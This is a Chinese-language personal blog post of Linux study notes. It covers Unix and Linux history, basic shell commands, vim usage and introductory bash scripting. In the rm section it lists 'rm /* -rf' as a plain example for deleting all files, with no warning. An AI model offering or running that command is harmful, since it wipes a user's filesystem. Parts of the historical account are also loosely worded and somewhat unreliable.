<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="Linux, 前端 JavaScript 碳苯 Serio Web 计算机 Carbon 框架 微前端 大厂 furry 福瑞 程序员 IT">
    <meta name="description" content="sudo!">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>Linux | 碳苯</title>
    <link rel="icon" type="image/png" href="/favicon.png">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">

    <script src="/libs/jquery/jquery.min.js"></script>

<meta name="generator" content="Hexo 5.4.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>




<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">碳苯</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>留言板</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友情链接</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">碳苯</div>
        <div class="logo-desc">
            
            碳苯是一只毛茸茸的程序员
            
        </div>
    </div>

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			留言板
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友情链接
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/CoderSerio" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/CoderSerio" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    
<script src="/libs/cryptojs/crypto-js.min.js"></script>
<script>
    (function() {
        let pwd = '';
        if (pwd && pwd.length > 0) {
            if (pwd !== CryptoJS.SHA256(prompt('该文章设置了密码，如需查阅请联系碳苯桑')).toString(CryptoJS.enc.Hex)) {
                alert('密码错误，将返回主页！');
                location.href = '/';
            }
        }
    })();
</script>




<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/postimages/57.jpeg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">Linux</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        width: 345px;
        padding-left: 20px;
    }

    .toc-widget .toc-title {
        padding: 35px 0 15px 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
        padding-bottom: 30px;
        overflow: auto;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/">
                                <span class="chip bg-color">操作系统</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/" class="post-category">
                                操作系统
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2023-02-20
                </div>
                

                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
                    2022-11-08
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
                    8.2k
                </div>
                

                

                
                    <div id="busuanzi_container_page_pv" class="info-break-policy">
                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
                        <span id="busuanzi_value_page_pv"></span>
                    </div>
				
            </div>
        </div>
        <hr class="clearfix">

        
        <!-- 是否加载使用自带的 prismjs. -->
        <link rel="stylesheet" href="/libs/prism/prism.css">
        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>每天下班回来至少都是十点过了，但是还是想给自己充充电。</p>
<p>但是为什么是学Linux呢？一方面是觉得作为一个程序员嘛，多少还是得接触一下计算机三大浪漫之一——我想知道为什么大家说他是浪漫的；另一方面是想做一个牛逼哄哄的项目，将所有技术整合到其中，不得不从Linux开始学习，为服务器的相关操作打下基础。</p>
<p>这期间也读到了一些历史事迹，真的很有意思，从肯·汤姆森、丹尼斯·里奇的Unix，到理查德·斯托曼的自由软件基金会，再到李纳斯·托瓦兹的Linux——这一段历史真是相当震撼人心，我们阅读这些伟人的故事后，就像是灵魂得到了洗涤，一时间薪资、内卷等等现实的问题就被抛到一边了，只留下一种激动的心情难以平复——我想Linux的浪漫至少得有一半来自于这个传奇作者的个人魅力。</p>
<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="Linux发展史"><a href="#Linux发展史" class="headerlink" title="Linux发展史"></a>Linux发展史</h3><blockquote>
<p><strong>Unics时代（1965）</strong></p>
<p>1965年，贝尔实验室、麻省理工、奇异公司等联合发起<strong>Multics计划（Multiplexed Information and Computing System）</strong>,期望让一个主机能支持几百个终端。后来由于资金等缘故失败告终。</p>
<p>当时的其中一名研究人员就是<strong>Ken Thompson（肯·汤姆森）</strong>。<br>Thompson非常喜欢自己基于<code>Mutilcs</code>实现的游戏<code>star travel</code>，(为了能继续玩这款游戏)，1969年，他利用妻子外出度假的四周，用B语言实现了一个由<code>Mutilcs</code>计划的系统简化而来的操作系统核心程序（包括内核，文件系统，编辑器，编译器等），但最终也只能支持两个终端，因此被戏称为**Unics(Uniplexed Information and Computing System)**。 </p>
</blockquote>
<blockquote>
<p><strong>Unix时代（1973）</strong></p>
<p>Unics被广泛流传，后来经过贝尔实验室多次改进——特别是<strong>Dennis Ritchie（丹尼斯·里奇，C语言之父）和Thompson的合作</strong>，最终用C语言实现了真正实现了支持多个终端的操作系统，即<strong>Unix</strong>。</p>
</blockquote>
<blockquote>
<p><strong>GNU时代（1983）</strong></p>
<p>后来Unix又被广泛传播，出现了许多分支版本，比如<strong>Richard Stallman（理查德·斯托曼，自由软件基金会创始人）</strong>组织研发的——<strong>GNU</strong>。</p>
<p>GNU是<strong>GNU’s Not Unix</strong>的递归缩写（GNU-NU-U），发音被人为约定为/‘gnu:/，并且其目的是建立一个<strong>完全自由并且开源</strong>的操作系统，所以有人将其翻译为<strong>革奴计划</strong>。</p>
<p>GNU有着极为深远的影响，推动了操作系统发展的同时，还推动了开源协议<strong>GPL（General Public License）</strong>的发展，该协议规定：<strong>基于GPL项目的二次开发必须开源</strong>——<strong>允许交易、允许改动，但是必须传递自由</strong>。</p>
</blockquote>
<blockquote>
<p><strong>Linux时代（1991）</strong></p>
<p>芬兰赫尔辛基大学的大学生<strong>Linus Torvalds（李纳斯·托纳斯）</strong>，用bash和gcc就造出了<strong>Linux内核</strong>，并在GNU的感召下，将Linux以GPL协议开源，以一己之力推动了整个计算机事业的发展。</p>
<p>关于他，请一定要去读一下这一篇文章<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/446937900">知乎上看到的一篇关于李纳斯的文章</a>，有机会还可以看看他的自传<strong>《乐者为王》</strong></p>
<p>开源的<strong>LInux内核</strong>逐步被各大社区、组织机构甚至个人根据不同的需求改进，最终出现了如今无数版本百花齐放的局面，常见的版本有：Centos、Ubuntu、Deepin、RedHat、Debian、Kali Linux等等</p>
</blockquote>
<h3 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h3><blockquote>
<p>ls: 列出当前目录下所有文件，蓝色的是文件夹，白色的是普通文件，绿色的是可执行文件</p>
</blockquote>
<p>参数：<br>-l : 展示详细信息;<br>-h : 人性化的显示详细信息;<br>-a : 显示所有的文件(包括被隐藏的文件, 所有被隐藏的文件都是以.开头的);<br>ll 等价于ls -la</p>
<blockquote>
<p>pwd: 显示当前位置;</p>
</blockquote>
<blockquote>
<p>cd: cd + 路径;</p>
</blockquote>
<p>cd 默认返回家目录, cd .. 返回上一层目录, cd - 返回上一个待过的目录;</p>
<blockquote>
<p>cp: cp 路径1 路径2;</p>
</blockquote>
<p>(将路径1内容复制一份放路径2里面, 复制 + 粘贴 + 重命名);<br>eg:<br>cp a/tmp.txt b (复制一份到粘贴到b里面)；<br>cp a/tmp.txt b/tmp2.txt; (复制一份到粘贴到b里面,并重命名)<br>如果复制文件夹后面加-r<br>eg: cp a b -r; (将a复制一份粘贴到b里面)</p>
<ul>
<li>表示本文件夹里所有文件</li>
</ul>
<blockquote>
<p>mkdir a :创建文件夹a</p>
</blockquote>
<p>mkdir: 创建文件夹;(可以加-p创建一系列的文件夹)</p>
<p>eg:<br>mkdir /home/acs/a/b (在根目录下创建文件)<br>mkdir a/b/c -p (在该文件夹下创建a/b/c复合文件)</p>
<blockquote>
<p>history: 显示历史用过的指令;</p>
</blockquote>
<blockquote>
<p>rm: 删除,</p>
</blockquote>
<p>rm xxx: 删除某一文件;<br>rm xxx -r: 删除某文件夹;(支持正则表达式);</p>
<p>eg:<br>rm tmp.txt tmp2.txt (删除tmp.txt和tmp2.txt)<br>rm .txt (删除所有txt文件)<br>rm a/ (删除a里面所有东西)<br>rm /* -rf (删除所有文件)</p>
<p>windows彻底删除文件:Shift + Delete;</p>
<blockquote>
<p>mv: mv xxx yyy (剪切+ 粘贴)</p>
</blockquote>
<p>eg:<br>mv a/tmp.txt b/ (将a中tmp.txt文件挪到b文件夹里面)<br>mv b/tmp.txt a/tmp2.txt (将b中tmp.txt文件挪到a文件夹里面并重命名为tmp2.txt)<br>mv tmp2.txt tmp.txt (将tmp2.txt重命名为tmp.txt)</p>
<p>cp与mv区别:cp(复制+粘贴), mv(剪切+粘贴)<br>mkdir与touch区别:mkdir(创建文件夹), touch(创建文件)</p>
<blockquote>
<p>cat: cat xxx(查看xxx文件);</p>
</blockquote>
<p>eg:<br>cat a/tmp.cpp(查看tmp.cpp文件)</p>
<h3 id="编辑工具"><a href="#编辑工具" class="headerlink" title="编辑工具"></a>编辑工具</h3><h4 id="tmux"><a href="#tmux" class="headerlink" title="tmux"></a>tmux</h4><p>个人更喜欢vim…所以这个先跳过吧</p>
<blockquote>
<p>作用<br>1.分屏：可以在一个开发框里分屏<br>2.允许terminal在连接断开之后可以继续运行，让进程不会因为断开连接而中断</p>
<p>一个tmux可以有一堆session<br>每个sesion可开很多的window<br>每个window可以开很多pane<br>每个pane可以打开一个shell交互</p>
</blockquote>
<h4 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h4><p>命令行模式下的文本编辑器，根据扩展名判别编程语言，实现代码缩进、代码高亮</p>
<p><strong>基本操作</strong></p>
<blockquote>
<p>1.i：进入编辑模式</p>
<p>2.esc：进入一般命令模式</p>
<p>3.小键盘可以操作前后左右<br>注：在命令模式下：vim会卡在最后一个字符前面，编辑模式会卡在最后一个字符，不像win，移动到最后会直接换行<br>同样的，无论是什么模式，往左移动到开头就会停下</p>
<p>4.光标的移动操作：n<space> n是数字，光标会自动右移n个字符<br>一般命令模式下：0/home 将光标移动到本行开头<br>$/End 将光标移动到本行结尾<br>G:光标移动到最后一行</space></p>
<p>5.具体到哪一行的操作：<br>1).n/nG:表示想去具体到哪一行（n是到某一行的下面，nG是直达）<br>2).gg:到达第一行<br>3).n<enter> 向下跳n行</enter></p>
<p>6.查找与修改字符串的操作：<br>1)./word:在命令行模式下，光标之下寻找第一个值为word的字符串<br>2).?word:在光标之上第一个值为word的字符串<br>3).n:重复前一个查找操作<br>4).N:反向查找，也就是说前一个命令向前找，此命令下向后找<br>5).:n1,n2s/word1/word2/g:n1,n2为数字，在第n1与n2之间找word1，并替换为word2<br>:1,$s/word1/word2/g: 将全文的word1换成word2<br>:1,$s/word1/word2/gc:在每一次替换的时候都会让用户进行确认</p>
<p>7.:noh 关闭所查找的关键词的高亮</p>
<p>8.选中与删除<br>v:选中文本,按两下esc取消<br>d:删除选中文本(其实有剪切的特性)<br>dd:删除整行</p>
<p>9.复制与粘贴：<br>y:复制(文本)<br>p:在光标所处位置的下一行或下一个位置(通常当光标在两边时)粘贴<br>yy:复制当前行</p>
<p>10.撤销:u:撤销<br>ctrl+r:取消撤销<br>注:在windows里，ctrl+z撤销，ctrl+shift+z取消撤销</p>
<p>11.&gt; 将选中的文本整体向右移动<br>&lt; 将选中的文本整体向左移动</p>
<p>12.保存与退出：<br>:w保存<br>:w! 强制保存<br>一般命令模式下:按下ESC，按q退出<br>:q! 强制退出（不保存）<br>:wq 保存并退出<br>:wq! 强制保存退出</p>
<p>13.行号的显示与隐藏:<br>:set nonu 隐藏行号<br>:set nu 显示行号</p>
<p>14.paste模式:<br>为什么:当要粘贴过来的代码很长时，命令可能会失效，占用很大带宽，导致出现多重缩进<br>:set paste取消代码缩进，设置成粘贴模式<br>:set nopaste开启代码缩进</p>
<p>15.全选<br>ggdG 删除全部内容<br>gg=G 将全文格式化<br>ggyG 复制全部内容</p>
<p>16.vim的卡死处理<br>ctrl+q:当vim卡死时，可取消当前正在执行的命令</p>
<p>17.异常处理:当前进程出现冲突时，会出现异常<br>解决方法：1).找到正在多个打开的文件程序，并关掉，保证同一个进程只有同一个文件能打开<br>2).问题：当一个进程不小心被其他进程杀掉，当再打开main.cpp时，此时如果出现一个.swp缓存文件时会报错<br>解决：在没有任何一个进程打开该文件时，将.swp文件删掉即可</p>
</blockquote>
<h2 id="基础shell"><a href="#基础shell" class="headerlink" title="基础shell"></a>基础shell</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><h4 id="shell的定义"><a href="#shell的定义" class="headerlink" title="shell的定义"></a>shell的定义</h4><blockquote>
<p>我们有很多方式与计算机交互，这些交互的实现得益于接口——能够使外部操作内部的抽象结构，比如鼠标点击，这就是计算机留给用户操作自身的一种接口。</p>
<p><strong>Shell，是一种文本接口，是一种编程环境，也是命令语言、命令解释程序及程序设计语言的统称，更是我们通过命令行与操作系统沟通的语言</strong>，常说的CMD其实是指的<code>Command Shell</code>，而GitBash中的Bash是指的<code>Bourne Again Shell</code>，当然还有<code>zsh</code>、<code>K Shell</code>、<code>C Shell</code>和<code>Bourne Shell</code>等等。Shell可</p>
<p>shell脚本可以直接在命令行中执行，也可以将一套逻辑组织成一个文件，方便复用。</p>
</blockquote>
<p>这里需要着重强调一下<strong>Shell</strong>和<strong>Linux命令</strong>的关系:</p>
<blockquote>
<p>有了一定的逻辑和过程，而命令行只是单一的操作。<br>并且shell是面向过程的，可以说是Linux命令集的概称。<br>也可以从Shell作为一种编程环境的角度出发，将其理解为一个<strong>命令处理器</strong>和命令解释器，读入用户输入的Linux命令再进行解释后才交给操作系统执行。</p>
</blockquote>
<h4 id="终端的定义"><a href="#终端的定义" class="headerlink" title="终端的定义"></a>终端的定义</h4><p>而我们平时提到的<strong>终端</strong><code>terminal</code>，在几十年前是一种物理实体——我理解的是发挥着今天的显示屏的作用，而如今常见的形式就是一个没有实体的黑窗口，其和shell及linux的关系是：</p>
<blockquote>
<p><strong>通过terminal来书写shell，然后操作linux</strong></p>
</blockquote>
<p>接下来我们以最为常见的<code>bash</code>为例，<code>bash</code>文件扩展名是<code>sh</code>，且第一行为</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#! /bin/bash</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>（但是好像不写这个也没什么问题）</p>
<h4 id=""><a href="#" class="headerlink" title=""></a></h4><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><h4 id="单行注释"><a href="#单行注释" class="headerlink" title="单行注释"></a>单行注释</h4><blockquote>
<p>使用<code>#</code>符号进行单行注释</p>
</blockquote>
<h4 id="多行注释"><a href="#多行注释" class="headerlink" title="多行注释"></a>多行注释</h4><blockquote>
<p>使用<code>:&lt;&lt;EOF</code>和<code>EOF</code>进行多行注释（有时不加前面的冒号也行），<br>其中<code>EOF</code>可以替换成其他任何字符</p>
</blockquote>
<h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><h4 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h4><blockquote>
<p>表示字符串时，<strong>单双引号都可以，甚至不写引号也可以</strong></p>
<p>其他情况需要使用<code>$</code>或<code>${}</code>，根据字符串拼接情况选择性使用</p>
</blockquote>
<h4 id="修饰词"><a href="#修饰词" class="headerlink" title="修饰词"></a>修饰词</h4><p>直接看看实际脚本，并回忆一下之前我们提到的内容</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#! /bin/bash</span>
<span class="token assign-left variable">a</span><span class="token operator">=</span><span class="token number">123</span> <span class="token comment"># 注意不能随便加空格，会报错</span>
<span class="token builtin class-name">readonly</span> <span class="token assign-left variable">b</span><span class="token operator">=</span><span class="token number">456</span>
<span class="token builtin class-name">echo</span> 这是a:<span class="token variable">$a</span>
<span class="token builtin class-name">unset</span> b	<span class="token comment"># 删除变量，可以看做是置为空串</span>
<span class="token builtin class-name">echo</span> 这是b:<span class="token variable">$b</span>

<span class="token builtin class-name">export</span> <span class="token assign-left variable">c</span><span class="token operator">=</span><span class="token number">789</span> 
:<span class="token operator">&lt;&lt;</span><span class="token operator">!</span>
	全局变量，也叫环境变量，子进程可访问
	相反，普通的变量则叫做自定义变量 或 局部变量
<span class="token operator">!</span>
<span class="token builtin class-name">declare</span> -x c <span class="token comment"># 将全局变量设置为局部变量</span>
<span class="token builtin class-name">echo</span> 这是c的长度<span class="token variable">${<span class="token operator">#</span>c}</span>, 这是c的前两个字符<span class="token variable">${c<span class="token operator">:</span>0<span class="token operator">:</span>2}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>输出结果是什么？</p>
<blockquote>
<p>这是a:123<br>./test2.sh: line 5: unset: b: cannot unset: readonly variable<br>这是b:456<br>这是c的长度3,这是c的前两个字符78</p>
</blockquote>
<p>因为bash是逐行解释的脚本语言，这里报错了也没有影响到后续的执行</p>
<h4 id="默认变量"><a href="#默认变量" class="headerlink" title="默认变量"></a>默认变量</h4><p>默认变量大概就是一种约定式语法——并未声明过却可以使用的变量：</p>
<p>执行shell脚本的时候，可以向该脚本传递参数，这些参数使用如下形式的占位符表示其将被使用的位置:</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#! /bin/bash</span>

<span class="token builtin class-name">echo</span> 这是文件名: <span class="token variable">$0</span>
<span class="token builtin class-name">echo</span> 这是第一个参数: <span class="token variable">$1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>当我们用下述语句执行这个脚本：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 没错这个文件的名字是test3.sh</span>
./test3.sh <span class="token number">1</span> <span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>输出结果:</p>
<blockquote>
<p>这是文件名: ./test3.sh<br>这是第一个参数: 1</p>
</blockquote>
<p>没错，可以传不定参数（如果不传，则参数值默认为空串）</p>
<p>其他默认变量:</p>
<blockquote>
<p><strong>$#</strong><br><code>#</code>符号总是长度的意思，所以这里也是传参个数的意思</p>
<p><em><em>$</em> 或 $@</em>*<br><code>*</code>符号总是通配符，所以这个是列出所有传参，<br>至于后者，作用一样，只是格式不太一样，列出的参数带有双引号</p>
<p><strong>$$</strong><br>当前脚本进程的PID</p>
<p><strong>$?</strong><br>上一条脚本的退出状态（exit code，为0则是正常）</p>
<p><strong>$(cmd) 或 `cmd`</strong><br>返回cmd的stdout，区别是前者可嵌套，后者不可</p>
<p><strong>$PATH</strong><br>环境变量</p>
</blockquote>
<h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><p>直接看代码和注释吧:</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#! /bin/bash</span>

<span class="token assign-left variable">arr</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">1</span> <span class="token number">2</span> three<span class="token punctuation">)</span>
<span class="token builtin class-name">echo</span> <span class="token variable">${arr}</span> <span class="token comment"># 1 和c语言规则一样，首地址</span>
<span class="token builtin class-name">echo</span> <span class="token variable">${arr<span class="token punctuation">[</span>*<span class="token punctuation">]</span>}</span> <span class="token comment"># 1 2 three</span>

arr<span class="token punctuation">[</span>-1<span class="token punctuation">]</span><span class="token operator">=</span>-1 <span class="token comment"># 访问末尾最后一个</span>
arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span>
arr<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">8</span> <span class="token comment"># 可以动态添加，但是会压缩中间未使用的空间</span>

<span class="token builtin class-name">echo</span> <span class="token variable">${arr<span class="token punctuation">[</span>@<span class="token punctuation">]</span>}</span> <span class="token comment"># 0 2 -1 8</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="expr命令"><a href="#expr命令" class="headerlink" title="expr命令"></a>expr命令</h3><h4 id="内置命令"><a href="#内置命令" class="headerlink" title="内置命令"></a>内置命令</h4><p>可以类比MC指令中的<code>excute</code></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#! /bin/bash</span>
<span class="token assign-left variable">str</span><span class="token operator">=</span><span class="token string">"Hello World"</span>

<span class="token builtin class-name">echo</span> <span class="token variable"><span class="token variable">`</span><span class="token function">expr</span> length $str<span class="token variable">`</span></span>  <span class="token comment"># 报错，这样的表达是不正确的，双引号表示expr命令的参数</span>
<span class="token builtin class-name">echo</span> <span class="token variable"><span class="token variable">`</span><span class="token function">expr</span> length <span class="token string">"<span class="token variable">${str}</span>"</span><span class="token variable">`</span></span> <span class="token comment"># length求长度，输出11 </span>
